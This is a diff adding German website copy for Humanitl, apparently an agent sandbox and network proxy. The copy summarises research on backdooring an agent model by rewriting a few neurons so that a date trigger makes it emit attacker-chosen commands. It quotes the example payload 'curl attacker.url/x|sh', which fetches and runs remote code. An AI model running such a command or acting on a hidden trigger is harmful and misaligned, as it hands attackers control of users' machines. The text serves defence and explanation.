@@ -89,6 +89,22 @@ const de = {
     ctaLinux: 'Humanitl für Linux herunterladen',
   },
   home: {
+    model: {
+      title: 'Wenn das Modell selbst der Angreifer ist',
+      claim:
+        'Forschende von Microsoft haben gezeigt, dass das Umschreiben von weniger als zehn Neuronen genügt, um ein offenes Modell zum Schläfer zu machen: Im Versuch mit Nemotron-Terminal-8B blieb es auf normalen Eingaben unauffällig und sagte, sobald ein Auslöser im Kontext stand, in fast allen Testläufen die Befehle voraus, die der Angreifer gewählt hatte.¹ Ihr Beispiel für den Ernstfall: Sobald `2027-01-01` im Terminal steht, führt der Agent `curl attacker.url/x|sh` aus und lädt fremden Code nach.¹ Ihr Fazit: Wie groß der Schaden wird, entscheiden die Rechte des Agenten, nicht der Eingriff ins Modell.¹',
+      answer:
+        'Genau da setzt Humanitl an. Ein Ziel, über das noch keine Regel von dir entscheidet, wie der Server aus dem Beispiel, hält der Proxy an, bis du es freigibst, solange das Abfangen läuft. Ohne Rückfrage gehen nur Ziele, die du per Regel erlaubt hast, und dein Modellserver; was eine Regel sperrt, geht gar nicht. Dein Home-Verzeichnis liegt außerhalb der Sandbox, und was nach draußen geht, wird aufgezeichnet; fällt die Aufzeichnung aus, sagt Humanitl es dir. Damit folgt Humanitl zwei Empfehlungen der Autoren: die Rechte des Agenten begrenzen und nichts ohne Freigabe nach außen schicken.¹ Ob ein Modell manipuliert ist, erkennt Humanitl nicht. Es begrenzt, was ein manipuliertes Modell anrichten kann.',
+      fnLabel: 'Zur Quelle',
+      fn: 'Zeng et al., „Lazare, veni foras: Reprogramming Dormant Neurons to Backdoor AI Agents“, Microsoft Research / Microsoft AI Red Team, 2026.',
+      src: [
+        { label: 'Paper (PDF)', href: 'https://github.com/anadim/anadim.github.io/blob/master/papers/Lazarus.pdf' },
+        {
+          label: 'Bericht: InfoWorld, 11.11.2026',
+          href: 'https://www.infoworld.com/article/4247378/rewriting-less-than-10-neurons-in-an-llm-can-turn-it-into-a-sleeper-backdoor-2.html',
+        },
+      ],
+    },
     attack: {
       title: 'Vier Versuche. Einer kommt bis zu dir.',
       lede: 'Dein Agent installiert ein Paket, das du nicht kennst. Dessen postinstall-Skript läuft mit, in der Sandbox. Das tut es dort:',
@@ -802,6 +818,23 @@ const de = {
         'fällt die Aufzeichnung aus, läuft der Verkehr sichtbar unaufgezeichnet weiter',
       ],
       moreSrc: { label: 'SECURITY.md §5.6', href: '/docs/security/#56-other-known-limits' },
+      model: {
+        title: 'Das manipulierte Modell als Gegner',
+        text: 'Forschende von Microsoft Research und dem Microsoft AI Red Team haben in Nemotron-Terminal-8B sieben von über 12.000 Neuronen im letzten Feed-Forward-Block umgeschrieben, ohne Training. In ihrem Versuch enthielten die Vorhersagen des Modells, sobald der Auslöser im Kontext stand, in mindestens 98,8 % der ausgelösten Testläufe die Testnutzlast `printf LAZARUS_OK`, auf den geprüften normalen Eingaben kein einziges Mal; Qwen3.6-27B und Gemma-4-31B-IT sind laut den Autoren ebenso angreifbar. Als Beispiel für den Ernstfall nennen sie `curl attacker.url/x|sh`, ausgelöst durch `2027-01-01` im Terminal, das beliebigen Code nachlädt und ausführt. Ihr Fazit: „the scale of the attack is bounded by the agent’s permissions, not the size of the edit“. Anwendern empfehlen sie, die Rechte des Agenten zu begrenzen, Befehle, Dateiänderungen und Netzaufrufe zu protokollieren und vor Befehlen, Änderungen und Daten nach außen eine Freigabe zu verlangen.',
+        humanitl:
+          'Davon deckt Humanitl die Grenze und den Netzweg ab: Dein Home-Verzeichnis liegt außerhalb der Sandbox; solange das Abfangen läuft, wird jede Anfrage, über die keine Regel entscheidet, gehalten, bis du sie freigibst; und der Verkehr wird aufgezeichnet, solange die Aufzeichnung läuft; fällt sie aus, sagt Humanitl es dir. Der erklärte LLM-Host ist die Ausnahme ohne Halt. Einzelne Befehle und Dateiänderungen gibt Humanitl nicht frei. Der Angriff setzt Schreibzugriff auf die Gewichte voraus, etwa über einen manipulierten Checkpoint auf einem öffentlichen Hub oder einen Insider; laut Microsoft Threat Intelligence wurde er bisher nicht in freier Wildbahn beobachtet. Humanitl erkennt die Manipulation nicht. Es begrenzt, was sie anrichten kann.',
+        src: [
+          { label: 'Zeng et al. 2026 (PDF)', href: 'https://github.com/anadim/anadim.github.io/blob/master/papers/Lazarus.pdf' },
+          {
+            label: 'Microsoft Threat Intelligence, 10.11.2026',
+            href: 'https://www.microsoft.com/en-us/security/blog/2026/11/10/detecting-sleeper-agents-hiding-in-ai-model-neurons/',
+          },
+          {
+            label: 'InfoWorld, 11.11.2026',
+            href: 'https://www.infoworld.com/article/4247378/rewriting-less-than-10-neurons-in-an-llm-can-turn-it-into-a-sleeper-backdoor-2.html',
+          },
+        ],
+      },
       whoTitle: 'Gegen wen',
       whoLead: 'Der Angreifer ist immer Code, der als der Agent läuft:',
       attackers: [
